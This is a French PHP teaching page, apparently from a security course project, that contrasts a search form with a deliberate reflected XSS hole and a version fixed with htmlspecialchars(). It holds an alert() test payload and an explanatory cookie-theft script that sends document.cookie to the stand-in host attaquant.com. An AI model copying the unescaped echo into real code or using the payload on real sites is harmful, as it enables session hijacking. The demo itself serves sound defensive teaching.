<?php
/**
 * Démonstration XSS — Projet AEGIS Phase 2.5
 * Paramètre : ?version=vulnerable  (défaut)
 *             ?version=securise
 *
 * Test XSS : http://[IP]/xss_demo.php?q=<script>alert('XSS')</script>
 */

$version   = $_GET['version'] ?? 'vulnerable';
$recherche = $_GET['q'] ?? '';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>TechSud — Recherche <?= $version === 'securise' ? '(sécurisée)' : '(vulnérable)' ?></title>
    <style>
        body    { font-family: sans-serif; max-width: 700px; margin: 60px auto; }
        .warn   { background: #fff3cd; padding: 10px; margin-bottom: 15px; }
        .safe   { background: #d4edda; padding: 10px; margin-bottom: 15px; }
        .result { background: #f8f9fa; border: 1px solid #dee2e6; padding: 10px; margin-top: 10px; }
        .code   { background: #282c34; color: #abb2bf; padding: 10px; font-family: monospace; font-size: 0.9em; }
    </style>
</head>
<body>

<?php if ($version === 'vulnerable'): ?>
    <div class="warn">⚠️ VERSION VULNÉRABLE — XSS non filtrée</div>
    <h2>Recherche (vulnérable)</h2>
    <form method="GET">
        <input type="hidden" name="version" value="vulnerable">
        <input type="text" name="q" value="<?= $recherche ?>" placeholder="Rechercher...">
        <button type="submit">Rechercher</button>
    </form>

    <?php if ($recherche): ?>
        <div class="result">
            <!-- ❌ La valeur est affichée sans aucun échappement -->
            Résultats pour : <?= $recherche ?>
        </div>

        <div class="code">
            Code PHP utilisé :<br>
            echo "Résultats pour : " . $_GET['q'];
        </div>
    <?php endif; ?>

    <p><a href="?version=securise&q=<?= urlencode($recherche) ?>">→ Voir la version sécurisée</a></p>

<?php else: ?>
    <div class="safe">✅ VERSION SÉCURISÉE — XSS filtrée avec htmlspecialchars()</div>
    <h2>Recherche (sécurisée)</h2>
    <form method="GET">
        <input type="hidden" name="version" value="securise">
        <input type="text" name="q" value="<?= htmlspecialchars($recherche, ENT_QUOTES, 'UTF-8') ?>"
               placeholder="Rechercher...">
        <button type="submit">Rechercher</button>
    </form>

    <?php if ($recherche): ?>
        <div class="result">
            <!-- ✅ Échappement avec htmlspecialchars() -->
            Résultats pour : <?= htmlspecialchars($recherche, ENT_QUOTES, 'UTF-8') ?>
        </div>

        <div class="code">
            Code PHP utilisé :<br>
            echo "Résultats pour : " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
        </div>
    <?php endif; ?>

    <p><a href="?version=vulnerable&q=<?= urlencode($recherche) ?>">→ Voir la version vulnérable</a></p>

<?php endif; ?>

<hr>
<h3>Ce qu'un attaquant fait vraiment avec une XSS</h3>
<p>
    Afficher une alerte <code>alert()</code> n'est qu'une preuve de concept. En exploitation réelle,
    un attaquant utilise une XSS pour :
</p>
<ul>
    <li><strong>Vol de session</strong> : <code>&lt;script&gt;document.location='http://attaquant.com/steal?c='+document.cookie&lt;/script&gt;</code> — le cookie de session de la victime est envoyé à un serveur distant. Si le cookie d'un administrateur est volé, l'attaquant prend le contrôle de son compte sans connaître son mot de passe.</li>
    <li><strong>Keylogger</strong> : injection d'un script qui enregistre chaque frappe clavier et l'exfiltre, permettant de capturer des mots de passe saisis sur la page.</li>
    <li><strong>Redirection et phishing</strong> : forcer la page à se recharger vers un faux site identique pour récupérer les identifiants.</li>
    <li><strong>Défacement</strong> : modifier l'apparence de la page pour tous les visiteurs si la XSS est stockée (stored XSS).</li>
    <li><strong>Propagation</strong> : une XSS stockée dans un forum ou un commentaire se déclenche pour chaque visiteur, pas seulement pour l'attaquant.</li>
</ul>
<p>
    <code>htmlspecialchars()</code> convertit <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code> et <code>&amp;</code>
    en entités HTML. Le navigateur affiche les caractères mais ne les interprète jamais comme du code.
</p>

</body>
</html>
